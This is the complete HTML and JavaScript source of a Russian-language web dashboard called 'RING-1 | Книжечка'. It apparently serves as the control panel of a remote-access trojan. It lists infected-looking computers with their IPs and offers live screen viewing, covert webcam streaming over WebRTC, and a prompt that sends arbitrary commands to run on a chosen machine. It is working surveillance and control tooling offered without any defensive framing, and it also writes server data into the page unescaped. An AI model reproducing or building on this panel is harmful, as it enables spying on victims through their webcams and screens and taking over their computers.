<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RING-1 | Книжечка — реальный просмотр</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', monospace;
            background: #0a0a0a;
            color: #00ffcc;
        }
        
        .header {
            background: #000;
            border-bottom: 1px solid #00ffcc;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo { font-size: 24px; font-weight: bold; text-shadow: 0 0 5px #00ffcc; }
        .logout-btn { background: #ff0033; color: white; border: none; padding: 8px 20px; border-radius: 5px; cursor: pointer; }
        
        .container { max-width: 1400px; margin: 30px auto; padding: 0 20px; }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0,255,204,0.05);
            border: 1px solid #00ffcc;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }
        
        .stat-card .number { font-size: 32px; font-weight: bold; }
        
        .computers-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }
        
        .computer-card {
            background: #0a0a0a;
            border: 1px solid #00ffcc;
            border-radius: 10px;
            padding: 15px;
        }
        
        .computer-header {
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-bottom: 10px;
        }
        
        .status { padding: 2px 8px; border-radius: 5px; font-size: 12px; background: #00cc88; color: black; }
        .status.offline { background: #ff0033; }
        
        .action-buttons { display: flex; gap: 10px; margin-top: 15px; flex-wrap: wrap; }
        .action-btn {
            background: #1a1a1a;
            border: 1px solid #00ffcc;
            color: #00ffcc;
            padding: 6px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
        }
        .action-btn:hover { background: #00ffcc; color: black; }
        
        .stream-modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
            flex-direction: column;
        }
        
        .stream-header {
            background: #000;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #00ffcc;
        }
        
        .stream-video {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .stream-video video {
            max-width: 100%;
            max-height: 90vh;
            border: 2px solid #00ffcc;
            border-radius: 10px;
            background: #000;
        }
        
        .close-stream {
            background: #ff0033;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .loading { text-align: center; padding: 50px; color: #00ffcc; }
    </style>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.0/simplepeer.min.js"></script>
</head>
<body>
    <div id="app">
        <div class="loading">[RING-1] Загрузка...</div>
    </div>
    
    <div id="streamModal" class="stream-modal">
        <div class="stream-header">
            <span id="streamTitle" style="color: #00ffcc;">📺 Просмотр</span>
            <button class="close-stream" onclick="stopStream()">✕ Закрыть</button>
        </div>
        <div class="stream-video">
            <video id="streamVideo" autoplay playsinline muted></video>
        </div>
    </div>
    
    <script>
        let socket = null;
        let currentStreamComputerId = null;
        let currentSessionId = null;
        let peer = null;
        
        async function checkAuth() {
            const response = await fetch('/api/user', { credentials: 'include' });
            if (response.ok) {
                const user = await response.json();
                renderDashboard(user);
                connectSocket();
                loadComputers();
                setInterval(loadComputers, 15000);
            } else {
                window.location.href = '/login.html';
            }
        }
        
        function connectSocket() {
            socket = io();
            socket.on('connect', () => console.log('🔌 Socket connected'));
            
            socket.on('webrtc_signal', async (data) => {
                if (data.signal && peer) {
                    await peer.signal(data.signal);
                }
            });
        }
        
        async function loadComputers() {
            const response = await fetch('/api/computers', { credentials: 'include' });
            if (response.ok) {
                const computers = await response.json();
                updateComputersList(computers);
            }
        }
        
        function updateComputersList(computers) {
            const container = document.getElementById('computersContainer');
            if (!container) return;
            
            const onlineCount = computers.filter(c => c.status === 'online').length;
            document.getElementById('onlineCount').innerText = onlineCount;
            document.getElementById('totalCount').innerText = computers.length;
            
            if (computers.length === 0) {
                container.innerHTML = '<div style="color: #00ffcc; text-align: center; padding: 50px;">Нет подключённых компьютеров</div>';
                return;
            }
            
            container.innerHTML = computers.map(comp => `
                <div class="computer-card">
                    <div class="computer-header">
                        <span>🖥️ ${comp.computerName}</span>
                        <span class="status ${comp.status === 'online' ? '' : 'offline'}">${comp.status === 'online' ? 'ONLINE' : 'OFFLINE'}</span>
                    </div>
                    <div class="computer-info">
                        <p>📡 ${comp.computerId.substring(0, 12)}... | 💻 ${comp.os} | 🌐 ${comp.ip}</p>
                    </div>
                    <div class="action-buttons">
                        <button class="action-btn" onclick="startScreenStream('${comp.computerId}')">🖥️ Смотреть экран</button>
                        <button class="action-btn" onclick="startWebcamStream('${comp.computerId}')">🎥 Смотреть вебкамеру</button>
                        <button class="action-btn" onclick="sendCommand('${comp.computerId}')">⚡ Команда</button>
                    </div>
                </div>
            `).join('');
        }
        
        async function startScreenStream(computerId) {
            currentStreamComputerId = computerId;
            document.getElementById('streamTitle').innerHTML = `🖥️ Просмотр экрана: ${computerId}`;
            document.getElementById('streamModal').style.display = 'flex';
            document.getElementById('streamVideo').srcObject = null;
            
            const response = await fetch(`/api/stream/screen/${computerId}`, {
                method: 'POST',
                credentials: 'include'
            });
            
            if (response.ok) {
                const data = await response.json();
                currentSessionId = data.sessionId;
                initWebRTC(data.sessionId, computerId, 'screen');
            } else {
                alert('Не удалось начать стрим');
            }
        }
        
        async function startWebcamStream(computerId) {
            currentStreamComputerId = computerId;
            document.getElementById('streamTitle').innerHTML = `🎥 Просмотр вебкамеры: ${computerId}`;
            document.getElementById('streamModal').style.display = 'flex';
            document.getElementById('streamVideo').srcObject = null;
            
            const response = await fetch(`/api/stream/webcam/${computerId}`, {
                method: 'POST',
                credentials: 'include'
            });
            
            if (response.ok) {
                const data = await response.json();
                currentSessionId = data.sessionId;
                initWebRTC(data.sessionId, computerId, 'webcam');
            } else {
                alert('Не удалось начать стрим');
            }
        }
        
        function initWebRTC(sessionId, computerId, type) {
            if (peer) peer.destroy();
            
            peer = new SimplePeer({ initiator: true, trickle: false });
            
            socket.emit('join_stream', sessionId);
            
            peer.on('signal', (signal) => {
                socket.emit('panel_signal', { computerId, signal });
            });
            
            peer.on('stream', (stream) => {
                const video = document.getElementById('streamVideo');
                video.srcObject = stream;
                video.play();
            });
            
            peer.on('error', (err) => {
                console.error('WebRTC error:', err);
                alert('Ошибка соединения');
            });
        }
        
        async function stopStream() {
            if (currentSessionId) {
                await fetch(`/api/stream/stop/${currentSessionId}`, {
                    method: 'POST',
                    credentials: 'include'
                });
            }
            if (peer) {
                peer.destroy();
                peer = null;
            }
            document.getElementById('streamModal').style.display = 'none';
            const video = document.getElementById('streamVideo');
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
            currentSessionId = null;
            currentStreamComputerId = null;
        }
        
        async function sendCommand(computerId) {
            const cmd = prompt('Введите команду для выполнения на компьютере:');
            if (!cmd) return;
            
            const response = await fetch(`/api/command/${computerId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({ command: cmd })
            });
            
            if (response.ok) {
                alert('✅ Команда отправлена');
            } else {
                alert('❌ Компьютер не в сети');
            }
        }
        
        async function logout() {
            await fetch('/api/logout', { method: 'POST', credentials: 'include' });
            window.location.href = '/login.html';
        }
        
        function renderDashboard(user) {
            document.getElementById('app').innerHTML = `
                <div class="header">
                    <div class="logo">🔷 RING-1 | КНИЖЕЧКА</div>
                    <div class="user-info">
                        <span>👤 ${user.username}</span>
                        <button class="logout-btn" onclick="logout()">ВЫЙТИ</button>
                    </div>
                </div>
                <div class="container">
                    <div class="stats">
                        <div class="stat-card"><h3>🟢 ОНЛАЙН</h3><div class="number" id="onlineCount">0</div></div>
                        <div class="stat-card"><h3>📡 ВСЕГО</h3><div class="number" id="totalCount">0</div></div>
                        <div class="stat-card"><h3>🎥 АКТИВНЫХ</h3><div class="number" id="activeCount">0</div></div>
                    </div>
                    <h2 style="margin-bottom: 20px;">📟 ПОДКЛЮЧЁННЫЕ УСТРОЙСТВА</h2>
                    <div class="computers-grid" id="computersContainer">Загрузка...</div>
                </div>
            `;
        }
        
        checkAuth();
    </script>
</body>
</html>
